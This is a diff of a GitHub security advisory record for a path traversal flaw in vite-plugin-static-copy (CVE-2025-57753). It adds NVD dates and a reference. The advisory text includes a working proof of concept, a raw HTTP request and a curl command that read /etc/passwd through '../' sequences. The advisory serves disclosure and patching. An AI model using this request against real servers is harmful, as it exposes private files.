@@ -58,17 +58,21 @@
     ],
     "github_reviewed": true,
     "github_reviewed_at": "2025-08-21T14:53:52Z",
-    "nvd_published_at": null,
+    "nvd_published_at": "2025-08-21T16:15:34Z",
     "severity": "MODERATE"
   },
   "details": "### Summary\n\nFiles not included in `src` was possible to access with a crafted request.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\nArbitrary files can be disclosed by exploiting this vulnerability.\n\n### Details\n\nConsider the following configuration in used by `vite.config.ts`:\n\n```ts\nimport { defineConfig } from 'vite'\nimport { viteStaticCopy } from 'vite-plugin-static-copy'\n\nexport default defineConfig({\n    plugins: [\n      viteStaticCopy({\n        targets: [\n          {\n            src: \"./public/images\",\n            dest: \"./\",\n          },\n        ],\n      }),\n    ],\n  });\n```\n\nThe files under the `./public/images` is only expected to be served. Abusing this vulnerability, an attacker can access arbitrary files on the filesystem.\n\n### PoC\nI've attached a demo app to showcase the bug.\n\nRun it with `npm run dev` and issue the following HTTP request\n\n```\nGET /static/images/../../../../../../../etc/passwd HTTP/1.1\nHost: localhost:3001\nContent-Length: 2\n```\nOR \n```\ncurl --path-as-is -i -s -k -X $'GET' \\\n    -H $'Host: localhost:3001' -H $'Content-Length: 2' \\\n    --data-binary $'\\x0d\\x0a' \\\n    $'http://localhost:3001/static/images/../../../../../../../etc/passwd'\n```\nObserve that the `/etc/passwd` file is included in the response.\n\n<img width=\"1289\" height=\"449\" alt=\"Screenshot 2025-08-16 at 10 27 11\u202fPM\" src=\"https://github.com/user-attachments/assets/4de12612-7b86-44d7-a403-c76f12832e37\" />",
   "id": "GHSA-pp7p-q8fx-2968",
-  "modified": "2025-08-21T15:27:26.768912Z",
+  "modified": "2025-08-21T19:16:58Z",
   "published": "2025-08-21T14:53:52Z",
   "references": [
     {
       "type": "WEB",
       "url": "https://github.com/sapphi-red/vite-plugin-static-copy/security/advisories/GHSA-pp7p-q8fx-2968"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-57753"
     },
     {
       "type": "WEB",
